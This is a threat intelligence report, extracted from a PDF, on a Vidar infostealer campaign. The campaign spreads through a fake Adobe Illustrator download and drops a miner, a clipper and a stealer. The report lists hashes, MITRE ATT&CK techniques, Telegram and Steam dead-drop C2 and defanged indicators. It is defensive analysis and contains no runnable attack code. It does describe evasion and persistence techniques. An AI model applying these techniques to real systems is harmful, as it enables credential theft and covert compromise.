Introduction In recent months, there has been a significant increase in the reported instances in the detection of malicious advertising campaigns, promoting fake software websites with the aim of deceiving target users into downloading malware components. Vidar provides threat actors with the option to standardise preferences with regards to the data stolen by its implementation. Additionally, the malware utilises social media platforms to facilitate remote C2 functionality over Windows-based operating systems. The sample investigated within this report was delivered via a malicious link which pointed to a fake software download page for Adobe Illustrator. This site, hosted on Digital Ocean, led to the user downloading a password protected archive file, “FullMainFile_Use_2023_As_PassWrd.rar”, containing a 457 MB executable “Setup.exe” which appears to have been made from a legitimate Yahtzee scoreboard application. The customisation of the package prevents signature-based detection, while the password protection prevents antivirus products from inspecting the contents of the downloaded file before it is executed. This report documents the analysis of an instance of the Vidar malware, which was identified through our Security Operations Centre (SOC), and the successive investigation of the post-exploitation techniques.

TLP Status: White

Privileged & Confidential

Page 5 of 39"|data_input/vidar_reports/entry_0ea96cad-b887-4072-9e3a-f13f5a195221.text|d2e50ac43d114fc68b52b642dbea49ac
"Privileged & Confidential

Page 5 of 39

Malware History The Vidar malware strain is classified as a Trojan of the information stealer variety1 . The malware was first identified in 2018 2 as a variant of the Arkei malware family3 . It is a product that provides threat actors with the option to standardise preferences with regards to the data stolen by its implementation. Additionally, the malware provides remote C2 functionality within the context of the Windows operating systems, through the utilisation of social media platforms. To that extent, the IP address associated with the C2 infrastructure has been detected to be embedded within the profile of a user on such platforms. As a result of this configuration, the malware can subsequently access the related profile, interact with the associated IP address, and download a variety of files and additional malware components. At the time of writing, the most recent peer-reviewed literature indicates that the Vidar malware is mainly distributed via an exploit kit associated with the Fallout gaming franchise. Moreover, this exploit kit can be purchased online, at a cost of US$700 for the professional version4 , although a base-line version can be purchased for $250 5 . The malware is typically deployed via email communication channels, most commonly as an ISO file, which will be embedded within illicit installer programmes for otherwise legitimate software programmes, such as Adobe Photoshop or Microsoft Teams 6 ."|data_input/vidar_reports/entry_0ea96cad-b887-4072-9e3a-f13f5a195221.text|184ad3b078c94b9e941e4aa9a035f071
"Upon successful delivery, the malware possesses the capabilities of engaging in defence evasion techniques, which involves either the application of significantly large executable files or files that are digitally signed, with an expired digital certificate. Based on its design as an infostealer, the ultimate objective, within the context of deploying the Vidar malware strain, is to obtain sensitive data from an infected system, browsers, or digital wallets, and then exfiltrate this data to the associated threat actor. Cybercriminals possess the freedom to choose the type of data that they wish to obtain, via the utilisation of the Vidar malware, due to the plethora of internal options contained within the malware exploit kit. Some examples of such sensitive data-based entities include: •

Operating System Data



Account Credentials



Credit Card Data



Browser History."|data_input/vidar_reports/entry_0ea96cad-b887-4072-9e3a-f13f5a195221.text|65e460346267415c991c6e8389bc7b82
"Operating System Data



Account Credentials



Credit Card Data



Browser History.

Vidar malware records all of the stolen data into a text file, compresses it to an archive file in the ‘.zip’ format and then sends it to a C2 server. In conjunction with the ability to collect these data components, the Vidar malware can also be employed as a downloader for additional malware strains. The C2 centre complex will, in such cases, specify a malicious link containing the desired malware download packet and will, in due course, execute said malware. Trojans, such as Vidar, will remain undetected within the target landscape, and as such, they possess the ability to execute covertly, without their presence being known. In the case of the Vidar malware, it has been reported to have been successfully identified as running within the confines of the Task Manager as the “Delighters Simulations Retriever” process7 .

1 https://www.malwarebytes.com/blog/detections/spyware



vidar

2 https://blog.cyble.com/2021/10/26/vidar



stealer



under



the



lens



a



deep



dive



analysis/

3 https://www.infoblox.com/wp



content/uploads/threat



intelligence



report



vidar



infostealer.pdf

4 https://www.pcrisk.com/removal



guides/14274



vidar



trojan

5 https://any.run/malware



trends/vidar

6 https://www.checkpoint.com/cyber



hub/threat



prevention/what



is



malware/what



is



vidar



malware/

7 https://www.pcrisk.com/removal



guides/14274



vidar"|data_input/vidar_reports/entry_0ea96cad-b887-4072-9e3a-f13f5a195221.text|a170230640b944219e094f78f47329bb
"hub/threat



prevention/what



is



malware/what



is



vidar



malware/

7 https://www.pcrisk.com/removal



guides/14274



vidar



trojan

TLP Status: White

Privileged & Confidential

Page 6 of 39

Malware Details

Metadata

File name

FullMainFile_Use_2023_As_PassWrd.rar

Description

Password protected RAR file utilised as the malicious executable delivery mechanism

Size

2,138,204 bytes

MD5

a9e7fd1d332d4481367b35e1be6fa4ba

SHA



1

8eab3fbc92f7067512c35d0884dd3b9e28941cf7

SHA



256

e433512ad2b47afbc778ab161a218944b504c90f513ff320d2aa8bfc55d5cb25

File name

Setup.exe

O r iginal File Name

iHciaG.exe

Description

64-bit malicious executable used for installation of the Vidar stealerware

Size

479,221,504 bytes

MD5

82121649ff44e92e9b029fcdf0e25cce

SHA



1

4b69c4e931e15655d050e8683663982fd1195f9d

SHA



256

6afd1ceacb145d84e706c553247459bbd492733e50f21de8a42424ba7de87c62

Compile Time

16:04 2023



01



03

File name

moabLuck2.exe

O r iginal File Name

RunpeX.Stub.Framework.exe

Description

Initial intermediary C2 connections

Size

568,320 bytes

MD5

e0517d8299c81f1d9d083fa61a51073d

SHA



1

3aab92de3ef096444103760a147ff7058791421f

SHA



256

c5646cc9fe486f0644067fc294f83eb6a39ce6f28eea3708c9bf49e244acc0f9

TLP Status: White

Privileged & Confidential

Page 7 of 39

File name

Clip1.exe

Description

32-bit malicious executable used for C2 communication

Size

3,979,776 bytes

MD5

076ff7b77b0f86ba643a581727420e7a

SHA



1"|data_input/vidar_reports/entry_0ea96cad-b887-4072-9e3a-f13f5a195221.text|0bf97d9fa99e4e498dcbfa6139785f41
"Description

32-bit malicious executable used for C2 communication

Size

3,979,776 bytes

MD5

076ff7b77b0f86ba643a581727420e7a

SHA



1

d59cf71fd91645b00f868d4f913c18675a58156e

SHA



256

8e6e3db76d44df50f82628eaaaf96fd9ef4dad484bc954ad0388fc6b6a66da43

Compile Time

2023



01



06 01:08:32 UTC

File name

Mina.exe

O r iginal File Name

IntelCacheUpdater.exe

Description

32-bit malicious executable to drop config files and initiate Clip1.exe

Size

5,866,496 bytes

MD5

fb3be4185b968faec0c3ab87fb4b35aa

SHA



1

1178b06bceea6a8ef6d0a7e16d0b0e8fc600f9ce

SHA



256

a0434fdcaec62f8af073f34c580a94cb58d21203f5edf2ccbbcc467b53570d87

Compile Time

2023



01



05 19:31:14 UTC

File name

4 5 273182709226343864.exe

O r iginal File Name

WindowsFormsApp3.exe

Description

32-bit malicious executable used to initiate the download of mina.exe and clip1.exe

Size

7,680 bytes

MD5

14e2c358817e10280f1c513115471b0c

SHA



1

0c97db3dd0b50527421590c31a64d899c25c54b7

SHA



256

16cae9d579719cda69f0453f8542470768769feb7c72ba0619dac159f821072b

Compile Time

2057



02



02 11:12:05 UTC

TLP Status: White

Privileged & Confidential

Page 8 of 39

File name

bebra.exe

O r iginal File Name

MySQLInstallerUpdater.exe

Description

64-bit command and control executable utilised as part of data collection phase

Size

3,594,240 bytes

MD5

9db7f8ba57214489f97c8c785b4c727c

SHA



1

968df2ab397063fcf6eb7720fa5ca24744230bc7

SHA



256"|data_input/vidar_reports/entry_0ea96cad-b887-4072-9e3a-f13f5a195221.text|ac3b35530c094e16b49df33de33cbd28
"Size

3,594,240 bytes

MD5

9db7f8ba57214489f97c8c785b4c727c

SHA



1

968df2ab397063fcf6eb7720fa5ca24744230bc7

SHA



256

c9487cb734eaca9afb87d6f71614bdfca5f3f5e70568971391d53e369badf149

Compile Time

2023



01



02 17:14:43 UTC

TLP Status: White

Privileged & Confidential

Page 9 of 39

Mitre ATT&CK TTPs

Ta ctic

ID

Technique

Procedure

Di s covery

T1518.001

Security Software Discovery

Vidar checks if it’s running in a sandbox

T1497

Virtualisation/Sandbox Evasion

Vidar queries the firmware table to ascertain whether the sample is running in a sandbox or virtual machine

T1497.001

System Checks

Vidar queries the system to ascertain whether the sample is running in a sandbox or virtual machine

T1082

System Information Discovery

Vidar reads the machine’s software policies

T1083

File and Directory Discovery

Mina.exe reads .ini files

T1027

Obfuscated Files or Information

Vidar utilises XOR and Base64 to encode data

T1027.001

Binary Padding

The initial Setup.exe is enlarged to reduce the effectiveness of scanning tools

T1027.002

Software Packing

Some of the malware samples used in the campaign have been packed with KoiVM, Themida and VMProtect as an anti-forensic technique

T1027.005

Indicator Removal from Tools

Vidar contains obfuscated stack strings within executable files

T1070.004

File Deletion

The Bebra stealer deletes itself after it runs

T1036

Masquerading

Vidar creates files and directories within the user profile

T1036.004"|data_input/vidar_reports/entry_0ea96cad-b887-4072-9e3a-f13f5a195221.text|bcd71218be2543f288aeed6373983bea
"The Bebra stealer deletes itself after it runs

T1036

Masquerading

Vidar creates files and directories within the user profile

T1036.004

Masquerade Task or Service

The scheduled tasks use homoglyphs in their names and pretend to be legitimate services

T1070.006

Time Stomp

The WindowsFormsApp3.exe dropper shows

evidence of time stomping

T1129

Shared Modules

Vidar loads common Windows DLL files during execution

T1497

Virtualisation/Sandbox Evasion

Vidar queries the firmware table to ascertain whether the sample is running in a sandbox or virtual machine

T1497.001

System Checks

Vidar queries the system to ascertain whether the sample is running in a sandbox or virtual machine

T1574.010

Services File Permissions

Weakness

Vidar utilises icacls to modify permissions of files

Def ence Evasion

TLP Status: White

Privileged & Confidential

Page 10 of 39

T1204

User Execution

The initial sample is downloaded and executed manually

T1129

Shared Modules

Vidar downloads a collection of legitimate DLL files to access app data

T1055

Process Injection

Vidar utilises various process injection techniques, such as injecting an executable into a foreign process and modifying the context of a thread in another process

T1574.010

Services File Permissions

Weakness

Vidar utilises icacls to modify permissions of files

T1071

Application Layer Protocol

Downloads executable code from webserver via HTTP

T1053.005

Scheduled Task"|data_input/vidar_reports/entry_0ea96cad-b887-4072-9e3a-f13f5a195221.text|a9457e4b0e0e4c0ea95ba8a23c71f974
"T1071

Application Layer Protocol

Downloads executable code from webserver via HTTP

T1053.005

Scheduled Task

Laplas Clipper and XMRIG create scheduled tasks that run every minute

T1071.001

Web Protocols

Most of the communication is done over port 80 and port 443

T1102.001

Dead Drop Resolver

Uses Telegram/Steam to find C2 IPs

T1105

Ingress Tool Transfer

Downloads executable code from webserver via HTTP

T1119

Automated Collection

The Vidar malware collects all available data via automated scripts within the malicious executables

T1005

Data from Local System

Vidar attempts to harvest and steal browser information

T1115

Clipboard Data

Laplas Clipper monitors the clipboard for cryptocurrency addresses

Exfiltration

T1041

Exfiltration Over C2 Channel

Vidar can be tasked to exfiltrate files from disk

Credential Access

T1555.003

Credentials from Web Browsers

The Vidar malware collects any stored credentials from web browsers

Execution

Pri vilege Escalation

Persistence

Com mand and Control

Col lection

TLP Status: White

Privileged & Confidential

Page 11 of 39"|data_input/vidar_reports/entry_0ea96cad-b887-4072-9e3a-f13f5a195221.text|b304e5cede8c42c98305644672f262ea
Malware Functionality Overview Vidar is an infostealer malware which targets the Windows operating system. The sample we observed within this campaign was delivered through a malicious link, pointing to a fake software download page for Adobe Illustrator. This site, hosted on Digital Ocean, led to the user downloading a password protected archive file, “FullMainFile_Use_2023_As_PassWrd.rar”, containing a 457 MB executable “Setup.exe” which appears to have been made from a legitimate Yahtzee scoreboard application. The password protection would hinder automatic security tools from detecting the malicious component as could the inflated size of the file, since there are often size limits on what can be scanned. Embedded within this .exe was an AES encrypted sample of Vidar, which is decrypted at run time and injected into a legitimate Windows process. The unencrypted sample, internally labelled moabLuck2.exe, was obfuscated to frustrate analysis attempts using the KoiVM8 plugin for ConfuserEx, an open-source anti-debugging tool. Once executed, the moabLuck2.exe binary checks a Telegram account or a public Steam profile (used as dead drop resolver) to locate the current C2 server. It connects to the C2 over HTTP to receive configuration instructions telling it what types of information to steal, as well as an archive (samefiles.zip) containing legitimate .dlls. These are used during data collection to help retrieve information from different applications including browser data.|data_input/vidar_reports/entry_0ea96cad-b887-4072-9e3a-f13f5a195221.text|ef8c13b3edce4e7c8be59968722b5719
"This is all collated along with hardware information and files from the victim’s user profile. After exfiltrating sensitive data to the C2, the server passes the malware a list of URLs from which to download further binaries to execute. Observed payloads include Mina.exe, an XMRIG miner; Clip1.exe, a Laplas Clipper sample; and bebra.exe, a previously unknown malware strain with stealer functionality. Some samples were packed with Themida9 and others with VMProtect10 , both commercial packers with advanced anti-debugging features.

8 https://github.com/Loksie/KoiVM



Virtualization

9 https://www.oreans.com/Themida.php

10 https://vmpsoft.com/

TLP Status: White

Privileged & Confidential

Page 12 of 39

High-Level Overview Figure 1 illustrates the actions undertaken on a device, following the download of the Vidar executable:

Figure 1: Vidar steps undertaken after initial execution

TLP Status: White

Privileged & Confidential

Page 13 of 39

Setup.exe

METADATA

File name

FullMainFile_Use_2023_As_PassWrd.rar

Description

Password protected RAR file utilised as the malicious executable delivery mechanism

Size

2,138,204 bytes

MD5

a9e7fd1d332d4481367b35e1be6fa4ba

SHA



1

8eab3fbc92f7067512c35d0884dd3b9e28941cf7

SHA



256

e433512ad2b47afbc778ab161a218944b504c90f513ff320d2aa8bfc55d5cb25

File name

Setup.exe

O r iginal File Name

iHciaG.exe

Description

64-bit malicious executable used for installation of the Vidar stealerware

Size

479,221,504 bytes

MD5"|data_input/vidar_reports/entry_0ea96cad-b887-4072-9e3a-f13f5a195221.text|9b77ea2c2c1d42b586d76ab522acfdf2
"iHciaG.exe

Description

64-bit malicious executable used for installation of the Vidar stealerware

Size

479,221,504 bytes

MD5

82121649ff44e92e9b029fcdf0e25cce

SHA



1

4b69c4e931e15655d050e8683663982fd1195f9d

SHA



256

6afd1ceacb145d84e706c553247459bbd492733e50f21de8a42424ba7de87c62

Compile Time

16:04 2023



01



03

ANALYSIS The initial dropper witnessed within this strain of Vidar drops a password protected .rar file to avoid detection from antimalware solutions. Once unpacked the directory contains an executable file, setup.exe, and a directory entitled “langs”. Setup.exe is an unsigned executable which presents as being a “Yahtzee Scorboard”, detailed within figure 2.

Figure 2: Digital signature output

TLP Status: White

Privileged & Confidential

Page 14 of 39

The executable itself has also been marked on VirusTotal11 as malicious by various anti-malware solutions. A review of the decompiled executable uncovered two functions of particular interest: ‘moab3e’ and ‘moabEve5’. ‘Moab3e’ acts as the encryption key for an encoded executable file within the ‘moabEve5’ function. This can be seen within figure 3.

Figure 3: moabEve5 encoded file.

The encryption key utilised to encrypt the executable is generated within a function called ‘moab3e’. Figure 4 has been provided to evidence the code utilised to perform this action. The encryption cipher mode was that of “AES electronic codebook mode encryption” (ECB)."|data_input/vidar_reports/entry_0ea96cad-b887-4072-9e3a-f13f5a195221.text|88e3dac6e0344192b854c26a6f5ecb15
"11 https://www.virustotal.com/gui/file/6afd1ceacb145d84e706c553247459bbd492733e50f21de8a42424ba7de87c62/detection

TLP Status: White

Privileged & Confidential

Page 15 of 39

Figure 4: Moab3e encryption function

The encoded string within the ‘moabEve5’ decrypts to be a new executable by the name of moabLuck2.exe.

TLP Status: White

Privileged & Confidential

Page 16 of 39

moabLuck2.exe

METADATA

File name

moabLuck2.exe

O r iginal File Name

RunpeX.Stub.Framework.exe

Description

Initial intermediary C2 connections

Size

568,320 bytes

MD5

e0517d8299c81f1d9d083fa61a51073d

SHA



1

3aab92de3ef096444103760a147ff7058791421f

SHA



256

c5646cc9fe486f0644067fc294f83eb6a39ce6f28eea3708c9bf49e244acc0f9

ANALYSIS MoabLuck2.exe is an executable which has been compiled utilising the KoiVM in order to obfuscate the original code. This was noted when decompiling the executable as shown within figure 5.

Figure 5: Executable using KoiVM

The purpose of this executable is to initiate a connection to either Telegram or Steam profiles, whereby further instructions are provided as to the next hop for C2 functionality. Once a connection has been made to one of the intermediary C2 domains, another executable is downloaded and executed. Figures 6 and 7 show how these pages present on both identified platforms used by the threat actor.

TLP Status: White

Privileged & Confidential

Page 17 of 39"|data_input/vidar_reports/entry_0ea96cad-b887-4072-9e3a-f13f5a195221.text|a050acdd1fb9494985cf174bc3a688ef
"TLP Status: White

Privileged & Confidential

Page 17 of 39

https://t[. ]me/year2023start Jan 03 rd: tatok hxxp[://]5.75.173[. ]242:80| Jan 06 th: tatok hxxp[://]94.130.190[. ]48:80| Jan 11 th: tatok hxxp[://]49.12.113[. ]110:80| https://t[. ]me/tgdatapacks Jan 11 th: patay hxxp[://]5.75.182[. ]6:80| Jan 13 th: patay hxxp[://]91.107.156[. ]138:80| https://t[. ]me/jetbim Jan 16 th: liber hxxp[://]65.109.200[. ]241:80| Jan 20 th: liber hxxp[://]65.109.208[. ]140:80| https://t.me/litlebey Jan 23 rd: homos hxxp[://]65.109.210[. ]114:80| Jan 26 th: homos hxxp[://]95.217.16[. ]127:80|

Steam profiles:

tatok hxxp[://]116.202.7[. ]135|

tatok hxxp[://]49.12.8[. ]228|

patay hxxp[://]78.47.228[. ]65|

patay hxxp[://]78.47.172[. ]233|

liber hxxp[://]195.201.251[. ]109|

liber hxxp[://]116.202.0[. ]132|

liber hxxp[://]88.198.120[. ]151|

liber hxxp[://]195.201.237[. ]253|

homos hxxp[://]116.203.9[. ]69|

Figure 6: Telegram profiles used to locate C2

Figure 7: Steam profile used to locate C2

TLP Status: White

Privileged & Confidential

Page 18 of 39

Bebra.exe

METADATA

File name

bebra.exe

O r iginal File Name

MySQLInstallerUpdater.exe

Description

64-bit command and control executable utilised as part of data collection phase

Size

3,594,240 bytes

MD5

9db7f8ba57214489f97c8c785b4c727c

SHA



1

968df2ab397063fcf6eb7720fa5ca24744230bc7

SHA



256

c9487cb734eaca9afb87d6f71614bdfca5f3f5e70568971391d53e369badf149

Compile Time

2023



01



02 17:14:43 UTC"|data_input/vidar_reports/entry_0ea96cad-b887-4072-9e3a-f13f5a195221.text|812ba4d7d96d43e5b346746b020fc47e
"SHA



256

c9487cb734eaca9afb87d6f71614bdfca5f3f5e70568971391d53e369badf149

Compile Time

2023



01



02 17:14:43 UTC

ANALYSIS One of the executable files downloaded by the WindowsFormApp3.exe goes by the name of Bebra.exe. This executable has been renamed, and hash value look-ups reveal the true name of this file to be ‘MySQLInstallerUpdater.exe’. VirusTotal12 has listed this file as being malicious in nature. Behavioural analysis into the nature of this executable file uncovered that its primary function within this attack path was to act as the stealer. Figure 8 has been provided as an example of the AppData directories within the user profile accessed by the malware.

12 https://www.virustotal.com/gui/file/c9487cb734eaca9afb87d6f71614bdfca5f3f5e70568971391d53e369badf149/detection

TLP Status: White

Privileged & Confidential

Page 19 of 39

Figure 8: Sample of AppData directory enumeration activities

The Bebra executable makes an external network connection to YouTube, calling an API endpoint by the name of “getAccountSwitcherEndpoint”. The purpose of this API call is to enumerate information surrounding logged in user accounts on a device, an action in keeping with activity seen as being undertaken by the malware when enumerating and exporting session information stored within the browser. It was also noted that the Bebra executable does appear to be written in the Go language – this is due to the User-Agent of the request captured within figure 9."|data_input/vidar_reports/entry_0ea96cad-b887-4072-9e3a-f13f5a195221.text|63cb293eb3be4216a1ffd6dc339bad28
"Figure 9: Outbound YouTube API call

The executable file performs a self-delete after successful execution. Figure 10 details the command line utilised by the executable, making use of the Windows built-in tool “choice.exe” to perform this action.

Figure 10: Bebra.exe deleting itself after execution

TLP Status: White

Privileged & Confidential

Page 20 of 39

Mina.exe

METADATA

File name

Mina.exe

O r iginal File Name

IntelCacheUpdater.exe

Description

32-bit malicious executable to drop config files and initiate Clip1.exe

Size

5,866,496 bytes

MD5

fb3be4185b968faec0c3ab87fb4b35aa

SHA



1

1178b06bceea6a8ef6d0a7e16d0b0e8fc600f9ce

SHA



256

a0434fdcaec62f8af073f34c580a94cb58d21203f5edf2ccbbcc467b53570d87

Compile Time

2023



01



05 19:31:14 UTC

ANALYSIS The executable file Mina.exe has been noted as having two primary functions. Firstly, it downloads a configuration file and secondly it initiates Clip1.exe, which is an XMRIG cryptocurrency miner. Mina.exe takes a copy of itself and places it within the “ProgramData” directory of the target machine. The file is also hidden to avoid detection. Figures 11 and 12 have been provided to show how this presents. To evade detection, ICACLS is used to block read access to the directory for all users. The security identifiers(SIDs) within figure 11 map to “World” and “Anonymous Logon”.

Figure 11: Permissions set by executable

TLP Status: White

Privileged & Confidential

Page 21 of 39

Figure 12: Hidden directory"|data_input/vidar_reports/entry_0ea96cad-b887-4072-9e3a-f13f5a195221.text|5acf5d3997704c98a3add5cae6271b28
"Figure 11: Permissions set by executable

TLP Status: White

Privileged & Confidential

Page 21 of 39

Figure 12: Hidden directory

Persistence mechanisms are subsequently configured utilising scheduled tasks. Figures 13 and 14 provide the command line utilised by Mina.exe and how this is presented within the user space.

Figure 13: Persistence mechanisms

TLP Status: White

Privileged & Confidential

Page 22 of 39

Figure 14: Schedule task creation

TLP Status: White

Privileged & Confidential

Page 23 of 39

Clip1.exe

METADATA

File name

Clip1.exe

Description

32-bit malicious executable used for C2 communication

Size

3,979,776 bytes

MD5

076ff7b77b0f86ba643a581727420e7a

SHA



1

d59cf71fd91645b00f868d4f913c18675a58156e

SHA



256

8e6e3db76d44df50f82628eaaaf96fd9ef4dad484bc954ad0388fc6b6a66da43

Compile Time

2023



01



06 01:08:32 UTC

ANALYSIS The Clip1.exe file was identified as being a sample of the Laplas Clipper malware family. The key functionality of this malware strain is to steal data from the clipboards of infected users. The Laplas Clipper strain typically targets cryptocurrency users in order to redirect payments to the threat actors’ wallets. However, in this instance it was noted as acting and behaving as a stealer which is subsequently sent to the threat actor. A scheduled task is created for persistence purposes – this is achieved through the command line presented within figures 16 and 17.

Figure 15: Scheduled task creation"|data_input/vidar_reports/entry_0ea96cad-b887-4072-9e3a-f13f5a195221.text|80ce055b8b784f59897d4ff411c0f6b5
"Figure 15: Scheduled task creation

TLP Status: White

Privileged & Confidential

Page 24 of 39

Figure 16: Clipper persistence mechanism

Once the executable has configured the persistence mechanisms, it spawns a connection to an XMRIG mining pool. The application connects to a mining pool at xmr-eu1[.]nanopool[. ]org on port 14444 with the credentials listed in figure 18.

Figure 17: XMRIG mining pool credentials

Figure 18: Mining traffic

TLP Status: White

Privileged & Confidential

Page 25 of 39

Communications Vidar Command and Control In the latest iterations of the Vidar malware, samples have been noted as using Telegram and Steam profiles as intermediary C2 destinations. Once on a profile page, the malware parses the returned response in order to retrieve the next IP address location for further C2 instructions. Figure 19 has been provided to evidence the communication received back to Vidar from the C2 server . This response from the server details to Vidar the enumeration and data to provide back to the threat actor’s C2 environment.

Figure 19: Screenshot showing a network capture of the configuration being downloaded by the malware"|data_input/vidar_reports/entry_0ea96cad-b887-4072-9e3a-f13f5a195221.text|c29c0bb6bfa74d91841c1afbfb5116fe
"Figure 19: Screenshot showing a network capture of the configuration being downloaded by the malware

The instructions received by the C2 server back to the Vidar executable are in keeping with historically seen infections. This aspect of the campaign hasn’t seen significant change since its inception. Figure 20 has been provided to evidence some of the data sent by the Vidar malware back to the C2 servers, however, full system enumeration and the export of any stored credentials found within browsers has also been noted as being exfiltrated.

TLP Status: White

Privileged & Confidential

Page 26 of 39

Figure 20: Some of the captured data sent to the C2

TLP Status: White

Privileged & Confidential

Page 27 of 39

Clipper Command and Control Laplas Clipper was seen communicating with the domain clipper[.]guru. After checking in, the malware downloads a regular expression designed to recognise cryptocurrency addresses. Researchers at Cyble have documented this functionality 13

Figure 21: Clipper C2 communications

13 https://blog.cyble.com/2022/11/02/new



laplas



clipper



distributed



by



smokeloader/

TLP Status: White

Privileged & Confidential

Page 28 of 39"|data_input/vidar_reports/entry_0ea96cad-b887-4072-9e3a-f13f5a195221.text|2a423e878efd4da492f9dc637e49a01a
"laplas



clipper



distributed



by



smokeloader/

TLP Status: White

Privileged & Confidential

Page 28 of 39

Threat Intelligence Indicators of Compromise – Domains HXXP[://]CLIPPER[. ]GURU The Laplas Clipper was detected to have communicated with the clipper[. ]guru domain. Following the connection, the malware downloads a regular expression designed to recognise cryptocurrency addresses. The following table displays the threat intelligence profile of this domain: Domain: Resolved IP Addresses: Geolocation and ASN: Thr eat Intelligence Profile:

hxxp[://]clipper[. ]guru













45[.]159[.]189[. ]105 45[.]159[.]189[. ]79 45[.]159[.]189[. ]105 (Amsterdam, North Holland, Netherlands - Hosting Solution Ltd.) 45[.]159[.]189[. ]79 (Amsterdam, North Holland, Netherlands - Hosting Solution Ltd.) Categorised as malicious by 15 threat intelligence vendors within the VirusTotal platform Classified with a malware-based reputation within the Cisco Talos Intelligence platform

During the initial execution of the malware, it was identified that the malware attempted to connect to the hxxp[://]clipper[. ]guru domain. The domain was detected to have been attributed to the Laplas Clipper 14 , a cryptocurrency stealer which replaces wallet addresses on the clipboard to intercept currency transfers.

HXXPS[://]LAPLAS[. ]APP/SIGNIN

Domain:

Resolved IP Addresses:

Geolocation and ASN:

Thr eat Intelligence Profile:

hxxps[://]laplas[. ]app/signin



31[.]42[.]176[. ]127"|data_input/vidar_reports/entry_0ea96cad-b887-4072-9e3a-f13f5a195221.text|db00345cf4ed4a3998a61ee74f2b8a04
"Domain:

Resolved IP Addresses:

Geolocation and ASN:

Thr eat Intelligence Profile:

hxxps[://]laplas[. ]app/signin



31[.]42[.]176[. ]127



31[.]42[.]176[. ]127 (Amsterdam, North Holland)



Categorised as malicious by eight threat intelligence vendors within the VirusTotal platform Classified with a malicious-based reputation with Ukrainian location data, within the Cisco Talos Intelligence platform



14 https://blog.cyble.com/2022/11/02/new



laplas



clipper



distributed



by



smokeloader/

TLP Status: White

Privileged & Confidential

Page 29 of 39

HXXPS[://]T[. ]ME/YEAR2023START

Domain:

Resolved IP Addresses:

Thr eat Intelligence Profile:

hxxps[://]t[. ]me/year2023start



65 resolved IP addresses





The domain is registered to GoDaddy[. ]com, LLC Involved in UAC Bypass project (via @actraaz[. ]org) with a Russian tag and Security Researcher Targeting project (via @jumpsec[. ]com) with a North Korea tag Not categorised as malicious by any threat intelligence vendors within the VirusTotal platform Classified with a malicious reputation with Ukrainian location data, within the Cisco Talos Intelligence platform"|data_input/vidar_reports/entry_0ea96cad-b887-4072-9e3a-f13f5a195221.text|6a157bba6ba14afb8a2944d309595ebf
"Upon further analysis, the malware was detected to have attempted to retrieve C2 data from the IP address 49[.]12[.]113[. ]110 via port 80. The associated domain was detected to have connected to a Telegram channel, attributed to Vidar 15 , which was utilised for further C2 functionality. An example of such a profile is illustrated in figures 22 and 23:

Figure 22: Telegram user profile

15 https://twitter.com/TrackerC2Bot/status/1610256493823070208

TLP Status: White

Privileged & Confidential

Page 30 of 39

Figure 23: Telegram user profile with IP address

TLP Status: White

Privileged & Confidential

Page 31 of 39

HXXPS[://]STEAMCOMMUNITY[. ]COM/PROFILES/76561199467421923

Domain:

Resolved IP Addresses:

Thr eat Intelligence Profile:

hxxps[://]steamcommunity[. ]com/profiles/76561199467421923



Resolves to 2,000 IP addresses





The domain is registered to Network Solutions, LLC Not categorised as malicious by any threat intelligence vendors within the VirusTotal platform Classified with a favourable reputation with Ukrainian location data, within the Cisco Talos Intelligence platform



Moreover, the malware was likewise detected to have attempted to retrieve C2 data from the IP address 116[.]202[.]7[.]135. However, a connection to Steam profiles was observed during the correlating phase of analysis. These profiles were likewise attributed to Vidar 16 and were utilised for C2 functionality. An example of such a profile is illustrated in figure 24:"|data_input/vidar_reports/entry_0ea96cad-b887-4072-9e3a-f13f5a195221.text|da319e579b8941c3ab73d47e2dbf5ecd
"Figure 24: Steam profile with further IP for further C2

16 https://twitter.com/TrackerC2Bot/status/1610256493823070208

TLP Status: White

Privileged & Confidential

Page 32 of 39

Indicators of Compromise – IPv4 Addresses This section contains summarised threat intelligence profiles regarding the IP addresses associated with the C2 infrastructure, linked to the Vidar malware sample under analysis.

94[.]130[.]190[. ]48

Geolocation:

K öln, North Rhine



Westphalia, Germany

ASN:

Hetzner Online GmbH

Historical DNS:

O pen ports:















Thr eat Intelligence Profile:









TLP Status: White"|data_input/vidar_reports/entry_0ea96cad-b887-4072-9e3a-f13f5a195221.text|f021e5f29d594bef8f1a73fd2616c598
"ASN:

Hetzner Online GmbH

Historical DNS:

O pen ports:















Thr eat Intelligence Profile:









TLP Status: White

static[.]48[.]190[.]130[.]94[.]clients[.]your-server[. ]de: 2021-06-16 - 2023-01-23 intensa01-190-48[.]si[.]dhb[.]ourproshop[. ]net: 2012-03-17 - 2012-03-17 22: : SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1 443: HTTP/1.1 404 Not Found Content-Type: text/plain Date: Wed, 25 Jan 2023 18:27:28 GMT Content-Length: 18 404 page not found 2083: HTTP/1.0 400 Bad Request Client sent an HTTP request to an HTTPS server 2087: HTTP/1.0 400 Bad Request Client sent an HTTP request to an HTTPS server 8443: HTTP/1.1 400 Bad Request Content-Type: text/plain; charset=utf-8 Sec-WebsocketVersion: 13 X-Content-Type-Options: nosniff Date: Wed, 25 Jan 2023 06:21:00 GMT Content-Length: 12 Bad Request Categorised as malicious by ten threat intelligence vendors within the VirusTotal platform Associated with the “KidsOfTheApocalypse.exe” file – Redline Stealer malware On 09/01/2023, the IP address was added to the Abuse.ch ThreatFox IOC database for being involved with the malware family Vidar with tags Classified with a spam-based reputation within the Cisco Talos Intelligence platform

Privileged & Confidential

Page 33 of 39

91[.]107[.]156[. ]138

Geolocation:

Gunzenhausen, Bavaria, Germany

ASN:

Hetzner Online GmbH

Historical DNS:







static[.]138[.]156[.]107[.]91[.]clients[. ]your



server[. ]de: 2021



06



16



2023



01



23"|data_input/vidar_reports/entry_0ea96cad-b887-4072-9e3a-f13f5a195221.text|96721527fb50413b99dfd8423bb1cd9c
"Hetzner Online GmbH

Historical DNS:







static[.]138[.]156[.]107[.]91[.]clients[. ]your



server[. ]de: 2021



06



16



2023



01



23



.24n1z4ul6fktzfxuu3loepy9[.]cbox4[.]ignorelist[. ]com: 2022



06



25



2022



06



25

msconfig[.]noip[. ]me: 2016



05



10



2016



05



10

O pen ports:





Port 22: SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u1 Port 80: HTTP/1.1 403 Forbidden Server: nginx Date: Sun, 22 Jan 2023 05:39:45 GMT Content-Type: text/html Transfer-Encoding: chunked Connection: keep-alive ContentEncoding: gzip <html> <head><title>403 Forbidden</title></head> <body> <center><h1>403 Forbidden</h1></center> <hr><center>nginx</center> </body> </html>

Thr eat Intelligence Profile:

